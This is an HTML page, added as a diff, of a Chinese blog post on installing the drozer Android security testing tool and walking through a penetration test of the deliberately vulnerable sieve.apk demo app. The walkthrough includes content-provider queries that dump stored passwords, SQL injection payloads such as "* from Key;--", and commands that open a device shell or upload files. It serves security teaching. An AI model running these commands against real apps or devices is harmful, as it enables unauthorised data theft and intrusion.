@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>drozer使用说明 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="环境配置按照官网上的安装步骤安装后，原本可以使用，但是Mac升级后drozer连接时总是出现错误：   1[Errno 35] &#39;Resource temporarily unavailable&#39; 网上查了好多，没有解决办法，最后决定重新编译安装github上的drozer源码。安装过程中发现缺少了很多库，应该是缺少环境所以会连接错误。主要错误是：   1zipimport.Zip">
+<meta property="og:type" content="article">
+<meta property="og:title" content="drozer使用说明">
+<meta property="og:url" content="http://example.com/2017/04/26/drozer%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="环境配置按照官网上的安装步骤安装后，原本可以使用，但是Mac升级后drozer连接时总是出现错误：   1[Errno 35] &#39;Resource temporarily unavailable&#39; 网上查了好多，没有解决办法，最后决定重新编译安装github上的drozer源码。安装过程中发现缺少了很多库，应该是缺少环境所以会连接错误。主要错误是：   1zipimport.Zip">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-04-26T09:04:07.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.741Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-drozer使用说明" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/04/26/drozer%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" class="article-date">
+  <time datetime="2017-04-26T09:04:07.000Z" itemprop="datePublished">2017-04-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      drozer使用说明
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>按照<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/tools/drozer/">官网</a>上的安装步骤安装后，原本可以使用，但是Mac升级后drozer连接时总是出现错误：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Errno 35] &#39;Resource temporarily unavailable&#39;</span><br></pre></td></tr></table></figure>
+<p>网上查了好多，没有解决办法，最后决定重新编译安装github上的<a target="_blank" rel="noopener" href="https://github.com/mwrlabs/drozer">drozer</a>源码。<br>安装过程中发现缺少了很多库，应该是缺少环境所以会连接错误。<br>主要错误是：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipimport.ZipImportError: can’t decompress data; zlib not available</span><br></pre></td></tr></table></figure>
+<p>和  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: &#39;openssl&#x2F;opensslv.h&#39; file not found</span><br></pre></td></tr></table></figure>
+<p>需要重新编译安装<a target="_blank" rel="noopener" href="http://www.zlib.net/">zlib</a>、<a target="_blank" rel="noopener" href="https://www.openssl.org/source">openssl</a>两个库，因为Mac升级后好像不支持<code>openssl</code>的头文件了。安装后还需要重新编译安装python源码，以加入<code>zlib</code>和<code>ssl</code>的支持。<br>drozer编译过程中还会提示缺少其他python库，使用：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo pip install twisted&#x3D;&#x3D;10.2.0</span><br></pre></td></tr></table></figure>
+<p>进行安装即可，这里要注意一定要按照错误提示指定安装库的版本，因为drozer只认这个版本，高于或低于都会报错。</p>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p><strong>运行drozer会话</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ adb forward tcp:31415 tcp:31415 #adb forward tcp:local_port tcp:remote_port</span><br><span class="line">$ drozer console connect</span><br><span class="line">Selecting 98e42f04e96ae748 (LGE AOSP on HammerHead 4.4.4)</span><br><span class="line"></span><br><span class="line">            ..                    ..:.</span><br><span class="line">           ..o..                  .r..</span><br><span class="line">            ..a..  . ....... .  ..nd</span><br><span class="line">              ro..idsnemesisand..pr</span><br><span class="line">              .otectorandroidsneme.</span><br><span class="line">           .,sisandprotectorandroids+.</span><br><span class="line">         ..nemesisandprotectorandroidsn:.</span><br><span class="line">        .emesisandprotectorandroidsnemes..</span><br><span class="line">      ..isandp,..,rotectorandro,..,idsnem.</span><br><span class="line">      .isisandp..rotectorandroid..snemisis.</span><br><span class="line">      ,andprotectorandroidsnemisisandprotec.</span><br><span class="line">     .torandroidsnemesisandprotectorandroid.</span><br><span class="line">     .snemisisandprotectorandroidsnemesisan:</span><br><span class="line">     .dprotectorandroidsnemesisandprotector.</span><br><span class="line"></span><br><span class="line">drozer Console (v2.4.3)</span><br><span class="line">dz&gt; list # 列出所有模块</span><br><span class="line">app.activity.forintent                   Find activities that can handle the given intent</span><br><span class="line">app.activity.info                        Gets information about exported activities.</span><br><span class="line">app.activity.start                       Start an Activity</span><br><span class="line">app.broadcast.info                       Get information about broadcast receivers</span><br><span class="line">app.broadcast.send                       Send broadcast using an intent</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>出现<code>dz&gt;</code>提示符说明连接成功。<br><strong>枚举安装的包</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list # 列出设备中所有已安装的包</span><br><span class="line">dz&gt; run app.package.list -f [app name]</span><br><span class="line">dz&gt; run app.package.info -h # show UID&#x2F;Permission etc.</span><br><span class="line">...</span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help</span><br><span class="line">  -a PACKAGE, --package PACKAGE</span><br><span class="line">                        the identifier of the package to inspect</span><br><span class="line">  -d DEFINES_PERMISSION, --defines-permission DEFINES_PERMISSION</span><br><span class="line">                        filter by the permissions a package defines</span><br><span class="line">  -f FILTER, --filter FILTER</span><br><span class="line">                        keyword filter conditions</span><br><span class="line">  -g GID, --gid GID     filter packages by GID</span><br><span class="line">  -p PERMISSION, --permission PERMISSION</span><br><span class="line">                        permission filter conditions</span><br><span class="line">  -u UID, --uid UID     filter packages by UID</span><br><span class="line">  -i, --show-intent-filters</span><br><span class="line">                        show intent filters</span><br></pre></td></tr></table></figure>
+<p>其他的命令也都可以通过<code>-h</code>参数查看使用说明。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 枚举activity</span><br><span class="line">dz&gt; run app.activity.info -h</span><br><span class="line"># 枚举content provider</span><br><span class="line">dz&gt; run app.provider.info -h</span><br><span class="line"># 枚举service</span><br><span class="line">dz&gt; run app.service.info -h</span><br><span class="line"># 枚举broadcast receiver，动态注册的不能显示</span><br><span class="line">dz&gt; run app.broadcast.info -h</span><br></pre></td></tr></table></figure>
+<p><strong>确定应用的受攻击面</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface [package name]</span><br></pre></td></tr></table></figure>
+<p><strong>运行Activity</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.example.hello com.example.hello.MainActivity</span><br></pre></td></tr></table></figure>
+<p><strong>运行Service</strong>  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.start --component com.linkedin.android com.linkedin.android.authenticator.AuthenticationService</span><br></pre></td></tr></table></figure>
+
+<h2 id="用drozer做渗透测试"><a href="#用drozer做渗透测试" class="headerlink" title="用drozer做渗透测试"></a>用drozer做渗透测试</h2><blockquote>
+<p>从官网下载演示的漏洞APP <a target="_blank" rel="noopener" href="https://www.mwrinfosecurity.com/system/assets/380/original/sieve.apk">sieve.apk</a><br>A ‘Password Manager’ App, showcasing some common Android vulnerabilities.</p>
+</blockquote>
+<p>在手机上安装这个APP后，用drozer进行渗透测试。<br>1.获取包名  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br></pre></td></tr></table></figure>
+<p>2.获取应用的基本信息  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>3.确定attack surface  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>4.Activity<br>(1) 获取Activity信息  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>(2) 启动Activity  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.activity.start --component com.mwr.example.sieve</span><br><span class="line">dz&gt; help app.activity.start</span><br></pre></td></tr></table></figure>
+<p>5.Content Provider<br>(1) 获取Content Provider信息  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>(2) Content Provider数据泄露<br>先获取所有可以访问的Uri：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>获取各个Uri的数据  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --vertical</span><br></pre></td></tr></table></figure>
+<p>查询到数据说明存在漏洞<br>(3)Content Provider SQL注入  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;&#39;&quot;</span><br><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --selection &quot;&#39;&quot;</span><br></pre></td></tr></table></figure>
+<p>报错说明存在SQL注入<br>列出所有表：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* from sqlite_master where type&#x3D;&#39;table&#39;;--&quot;</span><br></pre></td></tr></table></figure>
+<p>获取某个表中的数据  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* from Key;--&quot;</span><br></pre></td></tr></table></figure>
+<p>(4) 同时检测SQL注入和目录遍历  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.injection -a com.mwr.example.sieve</span><br><span class="line">dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>6.Service<br>获取Service详情  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+<p>不使用drozer启动service  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell@hammerhead:&#x2F;$ am startservice -n package.name&#x2F;.SerivceName</span><br></pre></td></tr></table></figure>
+<p>7.Broadcast Receiver  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.broadcast.info # 获取broadcast receiver信息</span><br><span class="line">dz&gt; run app.broadcast.send # 通过intent发送broadcast receiver</span><br></pre></td></tr></table></figure>
+<p>8.文件操作<br>列出指定文件路径里全局可写/可读的文件  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.misc.writablefiles --privileged &#x2F;data&#x2F;data&#x2F;com.sina.weibo</span><br><span class="line">dz&gt; run scanner.misc.readablefiles --privileged &#x2F;data&#x2F;data&#x2F;com.sina.weibo</span><br><span class="line">dz&gt; run app.broadcast.send --component 包名 --action android.intent.action.XXX</span><br></pre></td></tr></table></figure>
+<p>9.其他模块  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; shell.start # 在设备上开启一个交互shell</span><br><span class="line">dz&gt; tools.file.upload &#x2F; tools.file.download #上传&#x2F;下载文件到设备</span><br><span class="line">dz&gt; tools.setup.busybox &#x2F; tools.setup.munimalsu #安装可用的二进制文件</span><br></pre></td></tr></table></figure>
+<p><strong>reference</strong><br>《Android安全攻防实战》<br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/goodhacker/p/3906180.html?utm_source=tuicool&amp;utm_medium=referral">http://www.cnblogs.com/goodhacker/p/3906180.html?utm_source=tuicool&amp;utm_medium=referral</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/04/26/drozer%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/" data-id="ckhe7o4mu004lchl7gtv0g4ld" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/04/29/CVE-2014-7911-Android%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CVE-2014-7911 Android提权漏洞（一）
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/04/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Java反序列化漏洞（二）漏洞原理</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
